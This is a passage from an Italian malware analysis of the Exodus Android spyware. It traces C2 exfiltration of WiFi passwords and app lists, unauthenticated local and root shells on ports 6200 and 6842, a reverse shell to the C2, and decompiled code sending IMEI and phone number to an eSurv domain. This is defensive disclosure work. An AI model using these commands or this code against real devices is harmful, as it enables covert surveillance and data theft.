0.0.0.0:<span class="k">*</span>              LISTEN
 tcp       0      0 0.0.0.0:6205           0.0.0.0:<span class="k">*</span>              LISTEN
 tcp       0      0 0.0.0.0:6209           0.0.0.0:<span class="k">*</span>              LISTEN
 tcp       0      0 0.0.0.0:6211           0.0.0.0:<span class="k">*</span>              LISTEN
 tcp       0      0 0.0.0.0:6212           0.0.0.0:<span class="k">*</span>              LISTEN
</code></pre></div> <p>Di seguito possiamo vedere un esempio di connessione alla porta 6209 che viene utilizzata per estrarre dati dall&#39;app Telegram. Siamo in grado di inviare al servizio comandi come <code>dumpmsgdb</code> o <code>getkey</code> (che scarica il file <code>tgnet.dat</code>).</p> <div class=highlight><pre class="highlight shell"><code>user@laptop:~<span class="nv">$ </span>nc 192.168.1.99 6209 | xxd
getkey
00000000: 1f8b 0800 0000 0000 0003 1361 6660 0022  ...........af<span class="sb">`</span>.<span class="s2">"
00000010: 06f3 e995 7bb6 9616 cd04 6126 0604 70b7  ....{.....a&amp;..p.
00000020: bfb9 e1d2 d959 e741 f220 3e2b 1073 0131  .....Y.A. &gt;+.s.1
00000030: 2392 1a10 9bcf d0c4 52cf d0d4 44cf d0dc  #.......R...D...

[...]

00000080: 24d5 02e4 2423 ac4e a2c8 4dcc 686e e247  </span><span class="nv">$.</span><span class="s2">..</span><span class="nv">$#.</span><span class="s2">N..M.hn.G
00000090: 0e27 4303 03c2 e164 4cf5 7062 c117 4e96  .'C....dL.pb..N.
000000a0: 4484 9309 f5c3 8915 cd4d bc88 7032 d433  D........M..p2.3
000000b0: 65c0 9f9e d240 8e32 a56a 3801 00c3 3f3c  e....@.2.j8...?&lt;
000000c0: ab18 0300 00  
</span></code></pre></div> <p>I dati acquisiti dai moduli di estrazione di <code>mike.jar</code> sono normalmente offuscati con XOR e memorizzati in una cartella denominata <code>.lost+found</code>&#39; sulla scheda SD. Vengono infine esfiltrati su una connessione TLS al server di Command &amp; Control <code>ws.my-local-weather[.]com</code> attraverso una coda di caricamento.</p> <p>Come accennato in precedenza, il nostro dispositivo di test Ã¨ stato automaticamente aggiornato al secondo stage, che ha iniziato a raccogliere dati. Ad esempio, la password della rete WiFi utilizzata dal telefono Ã¨ stata memorizzata nella cartella <code>/storage/emulated/0/.lost+found+found/0BDA068-9D27-4B55-B226-299FCF2B4242/</code> utilizzando il seguente formato di nome di file <code>D_MMM_2019_H_mm_ss_XXXXXXXXXXXXXXXXXXXXX.txt.crypt</code> (la data e ora seguita dall&#39;IMEI). <strong>Abbiamo altresÃ¬ osservato l&#39;agente inviare la password WiFi dal nostro telefono di test al server Command &amp; Control</strong>:</p> <div class=highlight><pre class="highlight shell"><code>PUT /7d2a863e-5899-4069-9e8e-fd272896d4c7/A35081BD-4016-4C35-AA93-38E09AF77DBA.php HTTP/1.1
User-Agent: it.promofferte:[REDACTED]
DETAILS: <span class="o">{</span><span class="s2">"date"</span>:<span class="s2">"[REDACTED]"</span>,<span class="s2">"imei"</span>:<span class="s2">"[REDACTED]"</span>,<span class="s2">"filenameb64"</span>:<span class="s2">"[REDACTED]</span><span class="se">\u</span><span class="s2">003d</span><span class="se">\u</span><span class="s2">003d"</span>,<span class="s2">"filepathb64"</span>:<span class="s2">"[REDACTED]</span><span class="se">\u</span><span class="s2">003d"</span>,<span class="s2">"fileDirectoryb64"</span>:<span class="s2">"[REDACTED]</span><span class="se">\u</span><span class="s2">003d"</span>,<span class="s2">"uploadType"</span>:<span class="s2">"WIFIPASSWORD"</span>,<span class="s2">"encrypted"</span>:true<span class="o">}</span>
Content-Type: application/octet-stream
Content-Length: 277
Host: ws.my-local-weather.com
Connection: Keep-Alive
Accept-Encoding: gzip

l.9TqRuosV..~.:. ...<span class="sb">`</span> <span class="o">[</span>REDACTED] ....s<span class="o">)</span>Sp.^...5z..d0pRu

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 18 Jan 2019 15:53:40 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip

OK
</code></pre></div> <p>Allo stesso modo, l&#39;agente ha anche inviato al Command &amp; Control l&#39;elenco delle applicazioni installate sul nostro telefono:</p> <div class=highlight><pre class="highlight shell"><code>PUT /7d2a863e-5899-4069-9e8e-fd272896d4c7/A35081BD-4016-4C35-AA93-38E09AF77DBA.php HTTP/1.1
User-Agent: it.promofferte:[REDACTED]
DETAILS: <span class="o">{</span><span class="s2">"date"</span>:<span class="s2">"[REDACTED]"</span>,<span class="s2">"imei"</span>:<span class="s2">"[REDACTED]"</span>,<span class="s2">"filenameb64"</span>:<span class="s2">"[REDACTED]</span><span class="se">\u</span><span class="s2">003d</span><span class="se">\u</span><span class="s2">003d"</span>,<span class="s2">"filepathb64"</span>:<span class="s2">"[REDACTED]</span><span class="se">\u</span><span class="s2">003d</span><span class="se">\u</span><span class="s2">003d"</span>,<span class="s2">"fileDirectoryb64"</span>:<span class="s2">"[REDACTED]</span><span class="se">\u</span><span class="s2">003d"</span>,<span class="s2">"uploadType"</span>:<span class="s2">"APPLIST"</span>,<span class="s2">"encrypted"</span>:true<span class="o">}</span>
Content-Type: application/octet-stream
Content-Length: 11502
Host: ws.my-local-weather.com
Connection: Keep-Alive
Accept-Encoding: gzip

<span class="o">(</span>..5.<span class="s2">"...0...gVE^R.gRT@WYS3^&amp;Q....9.ua8.+WCQ%]T^Q.
.UYY.R][V.0.5.6...1]0P&amp;.pYM.0AFZ[W~Q[S.

[REDACTED]

&lt;...wIwR;.|...2_P.UWTBY_P.FKZR.1P</span><span class="nv">$.</span><span class="s2">7..]6.;E5.&amp;.M_wEPAGP_^xWYR....]a.</span><span class="sb">`</span><span class="se">\c</span>G]Dd@c.xS<span class="nv">$.</span>..&lt;<span class="se">\[</span>p[]U...
Jh

HTTP/1.1 200 OK
Server: nginx
Date: <span class="o">[</span>REDACTED]
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip
</code></pre></div> <p>Questo Command &amp; Control sembra essere attivo almeno dall&#39;aprile 2017 ed Ã¨ stato registrato impersonando il servizio legittimo <a href="https://www.accuweather.com">AccuWeather</a>.</p> <div class=highlight><pre class="highlight plaintext"><code>Registrant Name: AccuWeather, Inc.
Registrant Organization: AccuWeather, Inc.
Registrant Street: 385 SCIENCE PARK RD
Registrant City: STATE COLLEGE
Registrant State/Province: PA
Registrant Postal Code: 16803-2215
Registrant Country: US
Registrant Phone: +1.8142358528
Registrant Phone Ext:
Registrant Fax: +1.8142358528
Registrant Fax Ext:
Registrant Email: accuweather@nycmail[.]com
</code></pre></div> <h3>Terminali Locali e Remoti</h3> <p>Per eseguire comandi sui dispositivi infetti, cosÃ¬ come per fornire un terminale remoto (una &quot;<em>reverse shell</em>&quot; per l&#39;esattezza) agli operatori del Command &amp; Control, <em>Exodus Two</em> tenta immediatamente di eseguire un payload scaricato con il nome <code>null</code>. Una volta lanciato, <code>null</code> verificherÃ  in primo luogo se Ã¨ in grado di fare fork e che non c&#39;Ã¨ nessun&#39;altra istanza di se stesso attualmente in esecuzione controllando se il numero di porta locale 6842 Ã¨ disponibile.</p> <p>Questo payload tenterÃ  quindi di istanziare una &quot;reverse shell&quot; con <code>/system/bin/bin/sh</code> al Command &amp; Control <code>ws.my-local-weather[.]com</code> sulla porta 22011. Vale la pena notare che questo terminale remoto non utilizza alcuna crittografia di trasporto. Il traffico transita in chiaro ed Ã¨ quindi potenzialmente esposto ad attacchi man-in-the-middle:</p> <p><img src="/images/esurv/reverse_shell.png" class="rounded-lg shadow-lg"/></p> <p>Allo stesso tempo, <code>null</code> espone anche una shell locale su 0.0.0.0:6842. Questa porta locale Ã¨ usata da <em>Exodus Two</em> per eseguire vari comandi sul dispositivo Android, come abilitare o disabilitare determinati servizi, o analizzare i database delle applicazioni.</p> <p>Tuttavia, esporre un terminale su tutte le interfacce disponibili lo renderÃ  ovviamente accessibile a chiunque condivida almeno una rete locale con un dispositivo infetto. Ad esempio, <strong>se un dispositivo infetto Ã¨ connesso ad una rete Wi-Fi pubblica, qualsiasi altro partecipante alla rete Ã¨ in grado di ottenere un terminale</strong> sul dispositivo senza alcuna forma di autenticazione o verifica, ma semplicemente collegandosi alla porta.</p> <div class=highlight><pre class="highlight shell"><code>user@laptop:~<span class="nv">$ </span>nc 192.168.1.99 6842 <span class="nt">-v</span>
Connection to 192.168.1.99 6842 port <span class="o">[</span>tcp/<span class="k">*</span><span class="o">]</span> succeeded!
u0_a114@hammerhead:/ <span class="nv">$ </span>id
id
<span class="nv">uid</span><span class="o">=</span>10114<span class="o">(</span>u0_a114<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>10114<span class="o">(</span>u0_a114<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1015<span class="o">(</span>sdcard_rw<span class="o">)</span>,1028<span class="o">(</span>sdcard_r<span class="o">)</span>,3003<span class="o">(</span>inet<span class="o">)</span>,50114<span class="o">(</span>all_a114<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>u:r:untrusted_app:s0
</code></pre></div> <p>Se l&#39;operatore mobile non applica una <em>client isolation</em> adeguata, Ã¨ teoricamente possibile che i dispositivi infetti siano anche esposti al resto della rete cellulare.</p> <p>Inevitabilmente, questo lascia il dispositivo esposto non solo ad ulteriori compromessi, ma anche a potenziale manipolazione dei dati.</p> <p><code>null</code> non Ã¨ l&#39;unico payload che espone un terminale sul telefono. Il binario <code>rootdaemon</code> offre infatti diverse altre possibilitÃ  di eseguire comandi sul dispositivo infetto semplicemente collegandosi alla porta TCP 6200 ed inviando uno dei seguenti comandi.</p> <p>L&#39;invio del comando <code>sh</code> alla porta TCP 6200 risulta nell&#39;apertura di un terminale:</p> <div class=highlight><pre class="highlight shell"><code>user@laptop:~<span class="nv">$ </span>nc 192.168.1.99 6200
sh
system@hammerhead:/ <span class="nv">$ </span>id
id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>system<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>system<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1015<span class="o">(</span>sdcard_rw<span class="o">)</span>,1028<span class="o">(</span>sdcard_r<span class="o">)</span>,2000<span class="o">(</span>shell<span class="o">)</span>,3003<span class="o">(</span>inet<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>u:r:system:s0
system@hammerhead:/ <span class="err">$</span>
</code></pre></div> <p>L&#39;invio del comando <code>cmd</code> seguito da un valido comando lo eseguirÃ  e mostrerÃ  l&#39;output (nell&#39;esempio usiamo <code>id</code> che mostra l&#39;identitÃ  dell&#39;utente del sistema che esegue i comandi emessi):</p> <div class=highlight><pre class="highlight shell"><code>user@laptop:~<span class="nv">$ </span>nc 192.168.1.99 6200
cmd id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>system<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>system<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1015<span class="o">(</span>sdcard_rw<span class="o">)</span>,1028<span class="o">(</span>sdcard_r<span class="o">)</span>,2000<span class="o">(</span>shell<span class="o">)</span>,3003<span class="o">(</span>inet<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>u:r:system:s0
</code></pre></div> <p>Facendo lo stesso come sopra ma con il comando <code>sucmd</code> eseguirÃ  il comando terminale come root:</p> <div class=highlight><pre class="highlight shell"><code>user@laptop:~<span class="nv">$ </span>nc 192.168.1.99 6200
sucmd id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1015<span class="o">(</span>sdcard_rw<span class="o">)</span>,1028<span class="o">(</span>sdcard_r<span class="o">)</span>,2000<span class="o">(</span>shell<span class="o">)</span>,3003<span class="o">(</span>inet<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>u:r:system:s0
</code></pre></div> <p>Altri comandi supportati da <code>rootdaemon</code> sulla porta TCP 6200 sono <code>su</code> (che nei nostri test non ha funzionato correttamente), <code>loadsocketpolicy</code>, <code>loadfilepolicy</code>, <code>remount</code> e <code>rimooveroot</code>.</p> <p>A costo di essere forse eccessivamente prolissi, ecco l&#39;output di una scansione nmap del dispositivo Android infetto da un computer portatile connesso alla stessa rete locale, che dimostra ulteriormente la disponibilitÃ  delle stesse porte TCP aperte che abbiamo finora menzionato:</p> <div class=highlight><pre class="highlight shell"><code>user@laptop:~<span class="nv">$ </span>nmap 192.168.1.99 <span class="nt">-p6000-7000</span>

Starting Nmap 7.40 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-02-28 17:12 CET
Nmap scan report <span class="k">for </span>android-[REDACTED] <span class="o">(</span>192.168.1.99<span class="o">)</span>
Host is up <span class="o">(</span>0.035s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 994 closed ports
PORT     STATE SERVICE
6200/tcp open  lm-x
6201/tcp open  thermo-calc
6205/tcp open  unknown
6209/tcp open  qmtps
6211/tcp open  unknown
6212/tcp open  unknown
6842/tcp open  netmo-http

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>2.30 seconds
</code></pre></div> <h2>Identificazione di eSurv</h2> <h3>Lingua Italiana</h3> <p>Ad un primo sguardo, le prime copie dello spyware che abbiamo ottenuto non hanno mostrato immediatamente evidenti connessioni con nessuna azienda. Tuttavia, la ricorrente presenza della lingua Italiana sia sulle pagine di Google Play Store che all&#39;interno del codice dello spyware Ã¨ un chiaro segno che una entitÃ  Italiana Ã¨ coinvolta nella sua creazione. Alcune particolari parole contenute nel decompilato di <code>classes.dex</code> di <em>Exodus Two</em> ci hanno mandato nella giusta direzione.</p> <div class=highlight><pre class="highlight java"><code><span class="n">a</span><span class="o">(</span><span class="s">"MUNDIZZA"</span><span class="o">,</span> <span class="s">"09081427-FE30-46B7-BFC6-50425D3F85CC"</span><span class="o">,</span> <span class="s">".*"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
<span class="k">this</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">"UPLOADSERVICE Aggiunti i file mundizza. Dimensione coda upload {}"</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">c</span><span class="o">.</span><span class="na">size</span><span class="o">()));</span>
</code></pre></div> <p>&quot;<em>Mundizza</em>&quot; Ã¨ una parola dialettale, derivata dalla parola Italiana &quot;<em>immondizia</em>&quot;. Ã interessante notare che &quot;<em>mundizza</em>&quot; Ã¨ una parola tipica della Calabria e piÃ¹ precisamente sembra essere nativa della cittÃ  di Catanzaro.</p> <p>Inoltre, alcune copie di <em>Exodus One</em> usano la seguente chiave XOR:</p> <div class=highlight><pre class="highlight java"><code><span class="kt">char</span><span class="o">[]</span> <span class="n">cArr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="o">[]{</span><span class="sc">'R'</span><span class="o">,</span> <span class="sc">'I'</span><span class="o">,</span> <span class="sc">'N'</span><span class="o">,</span> <span class="sc">'O'</span><span class="o">,</span> <span class="sc">' '</span><span class="o">,</span> <span class="sc">'G'</span><span class="o">,</span> <span class="sc">'A'</span><span class="o">,</span> <span class="sc">'T'</span><span class="o">,</span> <span class="sc">'T'</span><span class="o">,</span> <span class="sc">'U'</span><span class="o">,</span> <span class="sc">'S'</span><span class="o">,</span> <span class="sc">'O'</span><span class="o">};</span>
</code></pre></div> <p>Rino Gattuso Ã¨ un famoso calciatore Italiano in pensione, originario della Calabria.</p> <p>Anche se non troppo seriamente, questi elementi ci hanno fatto delimitare la nostra ricerca sulle societÃ  di sorveglianza della regione.</p> <h3>Sovrapposizione dell&#39;infrastruttura con le telecamere di sorveglianza eSurv</h3> <p>Il dominio Command &amp; Control configurato in molte delle applicazioni malevole presenti su Google Play Store, <code>ws.my-local-weather[.]com</code>, risolve all&#39;indirizzo IP <code>54.69.156.31</code> che utilizza un certificato TLS self-signed con il nome comune <code>MyCert</code> e il fingerprint <code>11:41:45:45:2F:A7:A7:07:23:23:54:AE:9A:CE:CE:F4:FE:56:56:AE:AC:B1:C2:15:9F:6A:FC:1E:CC:7D:F8:61:E3:25:26:73:6A</code>. </p> <p>Una ricerca di questo fingerprint del certificato sul servizio di scansione Internet <a href="https://www.censys.io">Censys</a> restituisce 8 server aggiuntivi:</p> <table><thead> <tr> <th>IP address</th> </tr> </thead><tbody> <tr> <td>34.208.71.9</td> </tr> <tr> <td>34.212.92.0</td> </tr> <tr> <td>34.216.43.114</td> </tr> <tr> <td>52.34.144.229</td> </tr> <tr> <td>54.69.156.31</td> </tr> <tr> <td>54.71.249.137</td> </tr> <tr> <td>54.189.5.198</td> </tr> <tr> <td>78.5.0.195</td> </tr> <tr> <td>207.180.245.74</td> </tr> </tbody></table> <p>L&#39;apertura della pagina web Command &amp; Control in un browser presenta un prompt di autenticazione: </p> <p><img src="/images/esurv/c2_prompt.png" class="rounded-lg shadow-lg"/></p> <p>Chiedendo questo prompt, il server ritorna un errore &quot;401 Risposta Non Autorizzata&quot; con un messaggio &quot;ACCESSO NEGATO&quot;.</p> <p><img src="/images/esurv/c2_error.png" class="rounded-lg shadow-lg"/></p> <p>Tutti gli altri indirizzi IP scoperti che condividono lo stesso certificato TLS si comportano allo stesso modo.</p> <p>Il server di Command &amp; Control mostra anche un&#39;immagine favicon che sembra una piccola palla arancione.</p> <p>Al momento della scrittura, una ricerca inversa dell&#39;immagine della favicon su <a href="https://www.shodan.io">Shodan</a> utilizzando la query <code>http.favicon.favicon.hash:990643579</code> ha restituito circa 40 server web che utilizzano la stessa favicon.</p> <p><img src="/images/esurv/shodan_favicons2.png" class="rounded-lg shadow-lg"/></p> <p><img src="/images/esurv/shodan_favicons.png" class="rounded-lg shadow-lg"/></p> <p>Molti di questi server sono pannelli di controllo per sistemi di videosorveglianza sviluppati dall&#39;azienda Italiana <strong>eSurv</strong>, con sede a Catanzaro, in Calabria, Italia.</p> <p><img src="/images/esurv/advanced.png" class="rounded-lg shadow-lg"/></p> <p>I loro <a href="https://gfoeurope.it/public/File/Presentazioni%20Perugia/eSurv%20Present.%20GFO%20-%20Giungla%20Digitale%20Perugia.pdf">prodotti pubblicizzati pubblicamente</a> comprendono sistemi di gestione CCTV, droni di sorveglianza, sistemi di riconoscimento facciale e delle targhe.</p> <p>Il logo di eSurv Ã¨ identico alla favicon del server Command &amp; Control.</p> <p><img src="/images/esurv/c2_favicon.png" class="rounded-lg shadow-lg"/></p> <p><img src="/images/esurv/home.png" class="rounded-lg shadow-lg"/></p> <h3>Copie piÃ¹ vecchie che si collegano a eSurv</h3> <p>Infine, Google ha condiviso con noi alcuni vecchi campioni di <em>Exodus One</em> (con hash 2055584625d24687bd027a63bc0b8faa7d1a854a535de74afba24840a52b1d2f e a37f5d2418c5f2f2f64d06ba28fe62edee1293a56158ddfa9f04020e316054363f) che non sono offuscati e usano il seguente travestimento:</p> <p><img src="/images/esurv/phone1.png" class=mb-8 width=300px /></p> <p>La configurazione di queste copie piÃ¹ vecchie Ã¨ molto simile a quelle piÃ¹ recenti, ma fornisce ulteriori dettagli perchÃ© non Ã¨ offuscata:</p> <div class=highlight><pre class="highlight java"><code><span class="kn">package</span> <span class="n">com</span><span class="o">.</span><span class="na">vend</span><span class="o">.</span><span class="na">management</span><span class="o">.</span><span class="na">carrier</span><span class="o">.</span><span class="na">mylibrary</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Configuration</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">BUNDLE_CUSTOM_FILENAME</span> <span class="o">=</span> <span class="s">"D10CEE67-E1EF-4C17-96DC-BEB51B0A9A55"</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">BUNDLE_UNIVERSAL_FILENAME</span> <span class="o">=</span> <span class="s">"AD9FF676-875E-4294-A230-44EA1A4B15A1"</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">CERT_STRING_B64</span> <span class="o">=</span> <span class="s">"MIIDxzCCAq+gAwIBAgIJAM6NZPKxJWOzMA0GCSqGSIb3DQEBCwUAMHoxCzAJBgNVBAYTAkNOMRYwFAYDVQQIDA1GdW5nIFNoYW5nIEhvMRIwEAYDVQQHDAlIb25nIEtvbmcxGjAYBgNVBAoMEUNoaW5hIFRlbGVjb20gTHRkMSMwIQYDVQQDDBowMGludGVybmV0LWRldmVsLmlub2t1LmNvbTAeFw0xNjAzMTcxNTMwMTNaFw0yNjAzMTUxNTMwMTNaMHoxCzAJBgNVBAYTAkNOMRYwFAYDVQQIDA1GdW5nIFNoYW5nIEhvMRIwEAYDVQQHDAlIb25nIEtvbmcxGjAYBgNVBAoMEUNoaW5hIFRlbGVjb20gTHRkMSMwIQYDVQQDDBowMGludGVybmV0LWRldmVsLmlub2t1LmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMIJIK4rWDHeEnhjS5efXW2bpiX45BXaKPvULox4dzYiBUllFSAB4MujX3CZgu/fbBgNgIAV2n7h+KHfrBxlU0K9orIaZGEpiWLIJIXwS/1RY4dXnIdKmU2Dwogm9ZnJlzPLjJVM2iFDXj9dAm008PRo6UvGJ5g3GCs1xtCFErfDLvFiM2/hnlEPZtMFmLXonnQAALTjLwz+gD35IwFRiKgizDM0b0ZIhvMV+HPE/Zjot2rfsV/JI/uwvECVxUZNjs5GIMO2TwZAaK+B/PdLJY6iTcnmoxVscEXTDeYPpxu7o+R3GgbOYi1JOSBlDV3xAZhCdT5EHuoaWbyLJpm9xpkCAwEAAaNQME4wHQYDVR0OBBYEFMxK8XlJ1hzBGBvtwJL72q5Zk/hnMB8GA1UdIwQYMBaAFMxK8XlJ1hzBGBvtwJL72q5Zk/hnMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAJNvLXlxhBpu96dpPWqfvqkpf6iuByGr/VWgouJmh06g5/u4AgOYqhiZjJ1sm/yLt4/xnFDpwZIFVB7kDslXAgjim2eK5OIENigcrR6xcI+e/sd/PkGUlfEuKq8AZ+GUd4Ju2TK+ee7kh1keJKngRmLTo6Zk/G9iD2XycryUI3sjhx5UWGyZ+PNowDcGTjTPOQCLb9YXLPxS0zSEVQ55JJfabBlsmpFp/ePyEE240eiEW9DKKktKqK9KNjthExaCPnG3w00y6QTpkRQhY/rUord+/bHDuZ2Wk5dxOW1QK+Kjl1EJrDD+MBBlILgG82/gyiDaDSpEWfbn1O8KuieMxHk="</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">EXPLOIT_ARM</span> <span class="o">=</span> <span class="s">"07DD890F-8495-4E74-826F-BF7AED84B351"</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">EXPLOIT_I686</span> <span class="o">=</span> <span class="s">"6F6F8F3F-7996-44B4-AD92-4BB03D02D926"</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">HOST_DIRECTORY</span> <span class="o">=</span> <span class="s">"/7e661733-e332-429a-a7e2-23649f27690f/"</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">HOST_IP</span> <span class="o">=</span> <span class="s">"attiva.exodus.esurv.it"</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">HOST_WS_BUNDLE1</span> <span class="o">=</span> <span class="s">"B45551E5-8B53-4960-8B47-041A46D1B954"</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">HOST_WS_BUNDLE2</span> <span class="o">=</span> <span class="s">"6AD98532-7605-4DB0-9CE4-56816B203DBD"</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">HOST_WS_INIT</span> <span class="o">=</span> <span class="s">"7acbff64-7a3a-4ebd-8997-4839b5937024"</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">KEY_STRING_B64</span> <span class="o">=</span> <span class="s">"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7k5xg4sfzLcucmXE24jsI3fJ2+4vt3wVCR0WA3hfqDdlOx7EHWTKues1MLY1Cps8Y3nVId3E7GtzjTTlI++eHcoEd3eVXWdnGRtci+MB8O89HWLqhqCds/FmTkG4rdSF7oTlTcrKKwRs6QLqZceCQo00S9DXMNXIXOflXa4DTzH0LqlPcq8QTQGNKp8InC0fDsP02kGC4dNk1yNxCfJvVmXp06fYoLFrqYCofoBMkRkWTpTb83ibwdmE3LrzVLDwVNJHDCglgPKHvCPFex9+NRZIdzSDE6GxbuT+l+VbPYg8BpXjEtr68k81ZLFSnKrdSJLqtuJ0LvaTzEYxRikzzwIDAQAB"</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">PLACEHOLDER_AFTER_FIRST_EXECUTION</span> <span class="o">=</span> <span class="s">"5CBAECF0-6D42-430C-99AD-9493EC45C566"</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">UNZIPPED_FOLDER</span> <span class="o">=</span> <span class="s">"BD014144-796E-41B0-89C5-2EEC42765254"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div> <p>In primo luogo possiamo notare che, invece di nomi di dominio generici o indirizzi IP, queste copie di <em>Exodus One</em> comunicavano con un server di Command &amp; Control situato ad <code>attiva.exodus.esurv[.]it</code>.</p> <div class=highlight><pre class="highlight java"><code><span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">HOST_IP</span> <span class="o">=</span> <span class="s">"attiva.exodus.esurv.it"</span><span class="o">;</span>
</code></pre></div> <p><em>(Abbiamo chiamato lo spyware &quot;Exodus&quot; proprio per via di questo nome di dominio usato come Command &amp; Control.)</em></p> <p>Di seguito Ã¨ riportato il frammento di codice in questi vecchi campioni di <em>Exodus One</em> che mostrano la connessione al Command &amp; Control:</p> <div class=highlight><pre class="highlight java"><code><span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">encryptedBytes</span> <span class="o">=</span> <span class="n">StepOneCipher</span><span class="o">().</span><span class="na">doFinal</span><span class="o">((</span><span class="s">" "</span> <span class="o">+</span> <span class="s">"#"</span> <span class="o">+</span> <span class="n">imei</span> <span class="o">+</span> <span class="s">"#"</span> <span class="o">+</span> <span class="n">versione</span> <span class="o">+</span> <span class="s">"#"</span> <span class="o">+</span> <span class="n">telefono</span><span class="o">).</span><span class="na">getBytes</span><span class="o">());</span>
<span class="kd">final</span> <span class="n">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Request</span><span class="o">.</span><span class="na">Builder</span><span class="o">().</span><span class="na">url</span><span class="o">(</span><span class="s">"https://attiva.exodus.esurv.it/7e661733-e332-429a-a7e2-23649f27690f/7acbff64-7a3a-4ebd-8997-4839b5937024.php"</span><span class="o">).</span><span class="na">post</span><span class="o">(</span><span class="n">RequestBody</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">MTYPE</span><span class="o">,</span> <span class="n">encryptedBytes</span><span class="o">)).</span><span class="na">build</span><span class="o">();</span>
</code></pre></div> <p>Qui invece Ã¨ riportata la composizione quasi identica della richiesta al server Command &amp; Control in <code>mike.jar</code> (contenente anche l&#39;idendica cartella <code>7e661733-e332-429a-a7e2-23649f27690f</code>):</p> <div class=highlight><pre class="highlight java"><code><span class="k">if</span> <span class="o">(</span><span class="n">bArr</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">bArr</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="na">c</span><span class="o">().</span><span class="na">doFinal</span><span class="o">((</span><span class="s">" "</span> <span class="o">+</span> <span class="s">"#"</span> <span class="o">+</span> <span class="n">deviceId</span> <span class="o">+</span> <span class="s">"#"</span> <span class="o">+</span> <span class="n">str3</span> <span class="o">+</span> <span class="s">"#"</span> <span class="o">+</span> <span class="n">telephonyManager</span><span class="o">.</span><span class="na">getLine1Number</span><span class="o">()).</span><span class="na">getBytes</span><span class="o">());</span>
<span class="o">}</span>
